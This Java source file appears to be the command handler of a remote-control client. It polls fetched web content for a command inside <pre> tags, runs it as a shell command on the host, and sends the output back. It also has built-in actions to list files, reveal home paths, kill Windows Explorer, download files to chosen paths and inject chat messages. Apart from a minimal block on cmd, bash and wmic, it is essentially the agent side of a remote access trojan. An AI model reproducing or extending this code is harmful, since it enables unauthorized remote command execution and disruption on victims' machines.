package ch.lebois.client.handler;

import ch.lebois.client.configure.ClientValues;
import ch.lebois.client.console.Console;
import ch.lebois.client.service.BonziFunctions;
import ch.lebois.client.service.DownloadService;
import ch.lebois.client.service.ListFilesFunction;
import ch.lebois.client.service.Printer;
import ch.lebois.client.service.chat.Chat;

import java.util.Collections;
import java.util.List;

public class CommandReader {
    public static void read() {
        try {
            String command = ClientValues.commandReader.getContent().split("<pre>")[1].split("</pre>")[0];
            if (!command.equals("")) {
                if (!functions(command)) {
                    if (!command.startsWith("cmd") && !command.startsWith("bash") && !command.startsWith("wmic")) {
                        try {
                            List<String> responses = Console.execute(command);

                            assert responses != null;
                            Collections.reverse(responses);

                            for (String commandResponse : responses) {
                                new ResponseSender("response", commandResponse);
                            }
                            new ResponseSender().reset();
                        } catch (NullPointerException e) {
                            new ResponseSender("error", "No command '" + command + "' found");
                            new ResponseSender().reset();
                        }

                    } else {
                        new ResponseSender("error", "Command '" + command + "' not allowed");
                        new ResponseSender().reset();
                    }
                }

            } else {
                new ResponseSender("status", "online");
            }
        } catch (ArrayIndexOutOfBoundsException e) {
            return;
        }
    }

    private static boolean functions(String command) {
        boolean isFunction = true;
        if (command.startsWith("ls")) {
            new ListFilesFunction().listFiles(command);
        } else if (command.equals("pwd")) {
            new ResponseSender("response", "Java Home   | " + System.getProperty("java.home"));
            new ResponseSender("response", "Home Dir    | " + System.getProperty("user.home"));
            new ResponseSender("response", "Current Dir | " + System.getProperty("user.dir"));
            new ResponseSender().reset();
        } else if (command.equals("kill")) {
            new BonziFunctions().killExplorer();
            new ResponseSender().reset();
        } else if (command.equals("desktop")) {
            new BonziFunctions().showDesktop();
            new ResponseSender().reset();
        } else if (command.equals("printer")) {
            new Printer().getPrinters();
            new ResponseSender().reset();
        } else if (command.startsWith("download")) {
            new DownloadService().download(command.split(" ")[1], command.split(" ")[2]);
            new ResponseSender().reset();
        } else if (command.startsWith("chat")) {
            Chat chat = Chat.getInstance();
            chat.addMessage("Morgan", command.replace("chat ", ""));
            new ResponseSender().reset();
        } else {
            isFunction = false;
        }

        return isFunction;
    }
}
